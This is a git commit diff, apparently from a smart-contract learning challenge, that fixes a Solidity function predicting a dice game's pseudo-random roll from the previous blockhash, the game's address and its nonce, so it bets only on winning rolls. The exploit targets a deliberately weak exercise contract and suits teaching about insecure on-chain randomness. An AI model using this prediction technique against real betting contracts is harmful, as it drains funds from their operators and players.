23a86b0ffdcacb041791aa6e2bad011bd5420f50
Heisenberg-737 <pranay.kothari17@gmail.com>
2023-02-22 11:12:09 +0530

    All test cases passing

--- packages/hardhat/contracts/RiggedRoll.sol
+++ packages/hardhat/contracts/RiggedRoll.sol
@@ -16,15 +16,25 @@ contract RiggedRoll is Ownable {
 
     //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
     function riggedRoll() public {
-        require(address(this).balance >= .002 ether, "Insufficient Balance");
+        require(address(this).balance >= 0.002 ether, "Insufficient Balance");
+        // if (address(this).balance < 0.002 ether) {
+        //     console.log("Insufficient Balance of:", address(this).balance);
+        //     return;
+        // }
 
         bytes32 previousHash = blockhash(block.number - 1);
-        uint256 nonce = diceGame.nonce();
-        bytes32 hash = keccak256(abi.encodePacked(previousHash, address(this), nonce));
+        uint256 _nonce = diceGame.nonce();
+        // console.log("NONCE:", _nonce);
+        bytes32 hash = keccak256(abi.encodePacked(previousHash, address(diceGame), _nonce));
         uint256 roll = uint256(hash) % 16;
         require(roll <= 2, "Try Again!!");
+        // if(roll <= 2) {
+        // }
+        // console.log(roll);
+        // if (roll > 2) {
+        //     // console.log("TRY AAGAIN!!");
+        // }
         diceGame.rollTheDice{value: 0.002 ether}();
-        console.log(roll);
     }
 
     //Add withdraw function to transfer ether from the rigged contract to an address
